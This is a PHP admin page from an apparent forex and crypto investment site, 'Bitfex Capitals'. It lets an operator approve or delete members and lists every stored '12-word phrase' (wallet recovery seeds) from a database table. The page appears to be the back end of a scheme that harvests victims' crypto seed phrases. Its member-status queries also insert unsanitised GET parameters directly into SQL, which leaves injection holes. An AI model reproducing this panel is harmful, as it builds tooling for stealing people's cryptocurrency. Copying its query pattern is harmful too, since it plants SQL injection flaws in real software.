<?php require_once("../includes/session.php"); ?>
<?php 
include('../includes/connection.php');
include('../includes/functions.php');
include('../includes/image_upload_functions.php');
$pagetitle = "Bitfex Capitals - Forex and CFD trading with Quibmarket is easy and secure. Innovative Forex and CFD platform with trading professionals, account manager, brokers, personal account assistance trader and video assistance - Bitcoin Crypto Currency / Gold Wallet and Mining, Loan Investment Scheme, Investment and Retirement Management";
?><?php include('includes/header.php'); ?>
<?php
include('../includes/pagination.php');

?>
 <?php admin_logged_in(); 
 
 if (isset($_GET['approve'])) {
	// Success!
					$userid =  $_GET['approve'];
					$query = 	"UPDATE memberstbl SET 
						status = 1  
						WHERE user_id 	 = '$userid'";
			$result = mysqli_query($connection,$query);
			if($result)
			{ 

redirect_to("manage_members.php?status=asuccess");
}
}

if (isset($_GET['disapprove'])) {
	// Success!
					$userid =  $_GET['disapprove'];
					$query1 = 	"UPDATE memberstbl SET 
						status = 0   
						WHERE user_id 	 = '$userid'";
			$result1 = mysqli_query($connection,$query1);
			
			if($result1)
			{ 

redirect_to("manage_members.php?status=asuccess");
}
}


if (isset($_GET['delete'])) {
	// Success!
					$userid =  $_GET['delete'];
					$query2 = 	"UPDATE memberstbl SET 
						status = 7    
						WHERE user_id 	 = '$userid'";
			$result2 = mysqli_query($connection,$query2);
			
			if($result2)
			{ 

redirect_to("manage_members.php?status=asuccess");
}
}
 
 ?>

<!-- Left side column. contains the logo and sidebar -->
	<?php include('includes/sidebar.php'); ?>

      <!-- Content Wrapper. Contains page content -->
      <div class="content-wrapper">
        <!-- Content Header (Page header) -->
        <section class="content-header">
          <h1>
            Manage Members
            <small>Bitfex Capitals</small>
          </h1>
          <ol class="breadcrumb">
            <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
            <li><a href="#">Bitfex Capitals</a></li>
            <li class="active">Manage All Registered 12 Word Phrase</li>
          </ol>
        </section>

        <!-- Main content -->
        <section class="content"> 
          <div class="row"> 
            <div class="col-xs-12"> 
          
              <div class="box"> 
                <div class="box-header">
                  <h3 class="box-title">List of 12-word phrase</h3>
                </div><!-- /.box-header -->
                <div class="box-body" style="overflow:auto;">
                  <table id="example1" class="table table-bordered table-striped">
                    <thead>
                      <tr>
                        <th>ID</th>
						<th>12-word phrase</th>
	                     <th></th>
                      </tr>
                    </thead>
                    <tbody>
 <?php  
	 $item_per_page      = 1000000; //item to display per page
	 $page_url           = "<?php echo SITE_PATH ; ?>index";
	 if(isset($_GET["page"])){ //Get page number from $_GET["page"]
    $page_number = filter_var($_GET["page"], FILTER_SANITIZE_NUMBER_INT, FILTER_FLAG_STRIP_HIGH); //filter number
    if(!is_numeric($page_number)){die('Invalid page number!');} //incase of invalid page number
}else{
    $page_number = 1; //if there's no page number, set it to 1
}


$results = $connection->query("SELECT COUNT(*) FROM  trusttbl "); //get total number of records from database
$get_total_rows = $results->fetch_row(); //hold total records in variable

$total_pages = ceil($get_total_rows[0]/$item_per_page); //break records into pages

################# Display Records per page ############################
$page_position = (($page_number-1) * $item_per_page); //get starting position to fetch the records
//Fetch a group of records using SQL LIMIT clause
$results = $connection->query("SELECT * FROM  trusttbl WHERE status != 7 ORDER BY id ASC LIMIT $page_position, $item_per_page");

//Display records fetched from database.

//echo '<ul class="contents">';
//if(!$results) die(mysql_error());
//           		$x=0;
while($row = $results->fetch_assoc()) {
	// $x++
	 ?> 
                      <tr>
                        <td><?php echo $row['id']; ?></td>
                        <td><?php echo $row['wd_phrase']; ?></td>
                         <td><?php echo $row['status']; ?></td>
					
						
                      </tr>
					  
					   <?php

	 }

?>		
                      <?php //if(mysqli_num_rows($rs) < 1){
//}else{ 
  
	//	 }
################### End displaying Records #####################

//create pagination
echo '<div align="center">';
// We call the pagination function here.
echo paginate($item_per_page, $page_number, $get_total_rows[0], $total_pages, $page_url);
echo '</div>';
	   ?>
					
                    </tfoot>
                  </table>
                </div><!-- /.box-body -->
              </div><!-- /.box -->
            </div><!-- /.col -->
          </div><!-- /.row -->
        </section><!-- /.content -->
      </div><!-- /.content-wrapper -->
<?php include('includes/footer.php'); ?>